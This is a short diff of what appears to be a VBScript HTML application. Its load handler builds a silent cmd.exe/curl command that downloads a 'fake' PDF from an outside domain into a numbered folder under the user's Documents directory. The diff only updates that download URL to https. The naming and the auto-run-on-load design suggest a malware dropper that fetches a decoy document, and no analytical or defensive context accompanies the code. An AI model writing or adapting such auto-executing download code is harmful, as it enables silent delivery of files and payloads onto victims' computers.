@@ -31,7 +31,7 @@ Sub Window_OnLoad
     workDir = userProfile & "\Documents\928252966059280400"
     fakePdf = workDir & "\928252966059280400.pdf"
 
-    fakePdfUrl = "http://latigobrewco.com/928252966059280400.pdf"
+    fakePdfUrl = "https://www.latigobrewco.com/928252966059280400.pdf"
 
     cmdDownload = "cmd.exe /c mkdir """ & workDir & """ 2>nul & curl -s -L -o """ & fakePdf & """ " & fakePdfUrl
 
